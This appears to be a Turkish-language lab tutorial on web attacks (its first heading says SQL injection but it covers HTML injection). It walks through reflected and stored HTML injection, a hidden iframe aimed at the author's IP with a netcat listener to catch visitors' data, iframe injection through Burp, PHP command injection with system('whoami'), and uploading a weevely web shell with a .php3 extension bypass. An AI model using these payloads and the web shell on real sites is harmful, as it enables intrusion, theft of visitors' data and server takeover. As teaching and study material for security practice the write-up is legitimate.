SQL İNJECTİON - REFLECTED (GET)

![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)

bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak başlık satırı içinde adımı  yazıyorum.

![photo_6025856227893950465_w](https://user-images.githubusercontent.com/110966683/183883997-b8cb1b5b-2198-4612-ac88-f445d160f5e6.jpeg)

gördüğümüz gibi başlık olarak yazdı 

alert scripti deneyelim şimdi ekrana 1 yazdırması lazım

<h1>Hello,<script>alert(1)</script>!</h1>

![photo_6023604428080265318_w](https://user-images.githubusercontent.com/110966683/183884371-f0fefa5a-4830-465d-8f45-8b239cb8ccf7.jpg)

HTML İNJECTİON - STORED (BLOG)

eğer bir stored açığı olursa burda çalıştırdığımız bir kod web sitesine giren herkesi etkiler farklı bilgisayrdan bu web sitesine girseniz bile hackerin çalıştırdığı kod çalışacaktır.
örnek olarak alert scripti çalıştırırsak giren her kullanıcı bu alerti görür
alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
peki daha teklikeli olarak ne yapılabilir;
<iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
kendi bilgisayarımızın ip sini ve kullanılmayan bir portadresi yazıyoruz 

bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
dinlemek için linux terminalimizde natcat kullanacağız 
linux natcat komutu: nc -nvlp 4545 dinlemek için 


![photo_6023604428080265325_w](https://user-images.githubusercontent.com/110966683/183884730-c7d1a93e-aefe-488d-938b-738bfcd1d907.jpg)


görüldüğü gibi belirlediğimizportu dinledi ve kullanıcının bilgilerini getirdi.

İFRAME ENJECTİON


iframe enjeksiyonunda brupsuiti açıp proxy kısmından intercepti açıyoruz bu sayede tüm paketler yollanmadan buraya geliyor burda gelen paketi değiştirip forward  ediyoruz ve bizim yaptığımız değişikle site açılıyor 


![photo_6025856227893950471_w](https://user-images.githubusercontent.com/110966683/183889548-d56fb3e7-74a5-48ff-b77d-1a23062e705c.jpg)

gelen paket bu şekilde 

![photo_6025856227893950472_w](https://user-images.githubusercontent.com/110966683/183889597-765c5d39-cf45-40dc-ac85-7108d3520731.jpg)

görülen html kodunu yazıp forward ediyoruz 


![photo_6025856227893950474_w](https://user-images.githubusercontent.com/110966683/183889800-b5779563-0cdb-4db4-ab5e-396398df50a4.jpg)

görüldüğü gibi yazdığımız kod çalıştı.

PHP İNJECTİON

php urlsinde komut çalıştırmayı deniyoruz 
normalde iki komut çalıştırmek için komutların arasına ; konur şimdi bunu deneyeceğiz
; koyup system("whoamı") çalıştırıyoruz yani sistem içinde ben kimim komutu çalıştırıyoruz 

php upload açıkları
upload açıkları 
weevely weevely aracı bizim için php payloadı oluşturuyor 
weevely generate 123456 myweevely.php
weevely generate yazıp şifre sonrada isim yazıp payload oluşturuyoruz bunu resim update etme yerinden update etmeyi deneyeceğiz ve upload olunca weevely aracımıza gelip 
weevely yazıyoruz sonra update ettiğimiz url yi ve son olarak şifreyi yazıp giriyoruz 

![photo_6025856227893950494_w](https://user-images.githubusercontent.com/110966683/183912608-ed9b34b1-5c7d-44b5-9e28-b0ecf7d5f834.jpg)


gördüğünüz gibi sistemi hackledik.

varsayalım ki php yüklemeye çalıştığınız sistem .php uzantısını engellemiş o zaman linux terminalimize gelip cp myweevely.php myweevely.php3 (3 olmak zorunda değil siz başka rakamda deneyebilirsiniz.)şeklinde deneyebilirsiniz yani php dosyamızın adını php3 olarak değiştirdik sadece ama uzantı olarak hala php alternatif olarak denenebilir. 









